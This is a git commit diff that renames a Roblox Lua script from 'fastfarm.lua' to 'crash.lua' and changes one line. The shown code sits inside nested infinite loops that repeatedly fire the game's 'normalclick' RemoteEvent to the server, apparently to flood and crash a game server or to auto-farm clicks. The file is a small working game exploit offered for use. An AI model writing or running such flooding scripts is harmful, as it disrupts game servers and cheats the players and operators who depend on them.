47bc5266f486946c86f7a066b0fe88371fea410d
iuserbot <101830604+iuserbot@users.noreply.github.com>
2022-08-13 10:56:29 +0300

    Update and rename fastfarm.lua to crash.lua

--- crash.lua
+++ crash.lua
@@ -30,7 +30,7 @@ while true do
 while true do
 while true do
 while true do
-game:GetService("ReplicatedStorage").normalclick:FireServer(true)
+game:GetService("ReplicatedStorage").normalclick:FireServer(unpack({[1] = true}))
 end
 end
 end
